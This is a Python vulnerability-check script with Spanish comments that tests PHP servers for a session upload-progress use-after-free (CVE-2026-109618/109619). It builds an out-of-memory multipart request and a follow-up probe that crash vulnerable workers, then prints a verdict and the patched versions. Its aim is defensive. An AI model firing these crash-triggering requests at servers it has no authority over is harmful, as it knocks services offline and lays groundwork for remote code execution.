#!/usr/bin/env python3
"""
behavioural_diff.py — Test diferencial de exposicion para PHP2Shell
(CVE-2026-109618 / CVE-2026-109619).

Distingue un target VULNERABLE de uno PARCHEADO observando el
COMPORTAMIENTO, no el numero de version. Funciona igual de bien contra un
PHP cuyo numero de version no se pueda consultar.

MECANISMO (verificado en el laboratorio, ver BLOG.md seccion 10)
----------------------------------------------------------------
Request A: multipart con PHP_SESSION_UPLOAD_PROGRESS + un file part real +
           miles de uploads anidados vacios -> OOM durante el parseo.
           -> el heap se libera, el worker sobrevive con el estado de
              sesion colgando.

Request B: multipart SIN file part, mismo PHPSESSID, CON
           PHP_SESSION_UPLOAD_PROGRESS, mismo worker.
           -> php_session_rfc1867_cleanup() -> php_session_initialize()
           -> opera sobre PS(http_session_vars) liberada -> UAF.

Desenlaces observados en un target VULNERABLE:
  - respuesta vacia            (el worker muere con SIGSEGV)
  - "Session ID is too long"   (el puntero se leyó; PHP rechazó el contenido)

En un target PARCHEADO (8.2.35+):
  - el OOM ni siquiera se dispara: el parche "Avoid state corruption via
    bailout" lo convierte en un error blando. Request A responde limpio y
    Request B tambien.

DISCRIMINANTE: ¿se dispara el OOM en el Request A? Si NO, el target esta
parcheado (o tiene max_multipart_body_parts limitando el ataque).

Uso:
  python3 behavioural_diff.py <host> <port> [label]
Exit codes: 0 = parcheado, 1 = vulnerable, 2 = error
"""

from __future__ import annotations

import random
import socket
import string
import sys
import threading
import time

DEPTH = 12
# Registros por defecto. 1500 queda por debajo del limite de 2000 partes que
# impone PHP 8.2.35, de modo que el test sea COMPARABLE entre un target
# parcheado y uno vulnerable (si se usan 3000, el parcheado se corta por el
# limite de partes antes de llegar al OOM y el test no dice nada).
# Se puede cambiar con la variable de entorno RECORDS.
import os
RECORDS = int(os.environ.get("RECORDS", "1500"))


def rand_str(n: int) -> str:
    alpha = string.ascii_letters + string.digits
    return "".join(random.choice(alpha) for _ in range(n))


def build_multipart(parts, boundary: str) -> bytes:
    out = bytearray()
    for p in parts:
        out += f"--{boundary}\r\n".encode()
        out += f'Content-Disposition: form-data; name="{p["name"]}"\r\n'.encode()
        if p.get("filename") is not None:
            out += f'; filename="{p["filename"]}"\r\n'.encode()
            out += b"Content-Type: application/octet-stream\r\n"
        out += b"\r\n" + p["data"] + b"\r\n"
    out += f"--{boundary}--\r\n".encode()
    return bytes(out)


def post_raw(host: str, port: int, path: str, body: bytes, boundary: str,
             cookie: str = "", timeout: float = 90.0) -> bytes:
    hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
    )
    if cookie:
        hdr += f"Cookie: {cookie}\r\n"
    hdr += (
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    data = bytearray()

    def _reader():
        try:
            while len(data) < (1 << 22):
                chunk = s.recv(65536)
                if not chunk:
                    break
                data.extend(chunk)
        except OSError:
            pass

    r = threading.Thread(target=_reader, daemon=True)
    r.start()
    try:
        try:
            s.sendall(hdr.encode() + body)
        except OSError:
            pass
        r.join(timeout=timeout + 2)
    finally:
        s.close()
    return bytes(data)


def build_oom_body(boundary: str, depth: int, records: int) -> bytes:
    """Uploads anidados vacios con nombres de primer nivel DISTINTOS.

    El nombre distinto es imprescindible: con prefijo compartido PHP fusiona
    los arboles $_FILES y no se crea presion de memoria (falso negativo).
    """
    parts = [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "fz", "filename": "a.txt", "data": b"A" * 64},
    ]
    for i in range(records):
        name = f"f{i}[" + "][".join(f"a{j}" for j in range(depth)) + "]"
        parts.append({"name": name, "filename": "", "data": b""})
    return build_multipart(parts, boundary)


def build_probe_body(boundary: str, sid: str) -> bytes:
    """Request B: multipart SIN file part -> llega a MULTIPART_EVENT_END."""
    parts = [
        {"name": "PHPSESSID", "data": sid.encode()},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    return build_multipart(parts, boundary)


def run_round(host: str, port: int, path: str) -> dict:
    sid = rand_str(24)
    b = rand_str(20)
    body = build_oom_body(b, DEPTH, RECORDS)
    resp_a = post_raw(host, port, path, body, b,
                      cookie=f"PHPSESSID={sid}", timeout=90.0)
    oom = b"exhausted" in resp_a
    parts_limit = b"parts limit exceeded" in resp_a
    limit_value = 0
    if parts_limit:
        import re
        m = re.search(rb"parts limit exceeded (\d+)", resp_a)
        if m:
            limit_value = int(m.group(1))

    result = {
        "oom": oom,
        "parts_limit": parts_limit,
        "limit_value": limit_value,
        "resp_a_len": len(resp_a),
        "b_state": "skipped",
    }
    if not oom:
        return result

    time.sleep(0.15)
    b2 = rand_str(20)
    resp_b = post_raw(host, port, path, build_probe_body(b2, sid), b2,
                      cookie=f"PHPSESSID={sid}", timeout=25.0)
    if len(resp_b) == 0:
        result["b_state"] = "crash"
    elif b"too long or contains" in resp_b:
        result["b_state"] = "stale_sid"
    elif b"Failed to read session data" in resp_b:
        result["b_state"] = "stale_sid"
    else:
        result["b_state"] = "ok"
    time.sleep(0.25)
    return result


def main() -> int:
    if len(sys.argv) < 3:
        print("Uso: behavioural_diff.py <host> <port> [label]")
        return 2

    host, port = sys.argv[1], int(sys.argv[2])
    label = sys.argv[3] if len(sys.argv) > 3 else f"{host}:{port}"

    print(f"[*] Test diferencial de comportamiento contra {label}")
    print(f"[*] {RECORDS} uploads anidados (depth={DEPTH}) -> OOM, y despues")
    print("[*] un Request B con upload_progress al mismo worker.")
    print()

    rounds = 6
    ooms = 0
    crashes = 0
    stale = 0
    oks = 0
    limit_hits = 0

    for i in range(1, rounds + 1):
        r = run_round(host, port, "/index.php")
        if r["parts_limit"]:
            limit_hits += 1
            print(f"  ronda {i}/{rounds}: Request A -> limitado por "
                  f"max_multipart_body_parts (limite={r.get('limit_value')}, sin OOM)")
        elif r["oom"]:
            ooms += 1
        else:
            print(f"  ronda {i}/{rounds}: Request A -> sin OOM "
                  f"({r['resp_a_len']} bytes)")

        if r["b_state"] == "crash":
            crashes += 1
            print(f"             Request B -> CRASH (SIGSEGV: UAF consumido)")
        elif r["b_state"] == "stale_sid":
            stale += 1
            print(f"             Request B -> 'Session ID is too long' "
                  f"(puntero leido)")
        elif r["b_state"] == "ok":
            oks += 1
            print(f"             Request B -> limpio")
        time.sleep(0.2)

    print()
    print("=" * 68)
    print(f"  OOM disparado:            {ooms}/{rounds}")
    print(f"  Request B -> crash:       {crashes}")
    print(f"  Request B -> stale SID:   {stale}")
    print(f"  Request B -> limpio:      {oks}")
    if limit_hits:
        print(f"  Limitado por multipart:   {limit_hits}")
    print("=" * 68)

    if limit_hits == rounds:
        print()
        print("[?] BLOQUEADO POR max_multipart_body_parts, no evaluable.")
        print("[?] La peticion se corto antes de llegar al OOM, asi que este test")
        print("[?] NO permite concluir nada sobre si el servidor es vulnerable.")
        print("[?] -> Repetir con un numero de registros por debajo del limite")
        print("[?]    del servidor (o usar check_exposure.sh, que informa del limite).")
        return 0

    affected = crashes + stale
    if affected:
        print()
        print(f"[!] VEREDICTO: {label} es VULNERABLE.")
        print("[!] El estado de sesion colgante se consumio en "
              f"{affected} de {rounds} rondas.")
        print("[!] Condicion previa de CVE-2026-109619 (RCE sin autenticacion).")
        print("[!] Remedio: actualizar PHP (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12).")
        return 1

    if ooms:
        print()
        print(f"[?] {label}: el OOM se dispara pero el UAF no se observo en "
              f"{rounds} rondas.")
        print("[?] Causa probable: OPcache activo (seccion 10.8 del BLOG). Con")
        print("[?] OPcache el UAF existe pero no se manifiesta como SIGSEGV.")
        print("[?] Esto NO es una senal de que el servidor este parcheado.")
        return 0

    print()
    print(f"[+] VEREDICTO: {label} NO es vulnerable a esta rama.")
    print("[+] El OOM nunca se dispara pese a enviar "
          f"{RECORDS} partes multipart anidadas.")
    print("[+] El parche oficial (commit 31c0ea7d7ff, 'Avoid state corruption via")
    print("[+] bailout') convierte el OOM en un error blando. Riesgo de")
    print("[+] CVE-2026-109619/109618 mitigado.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
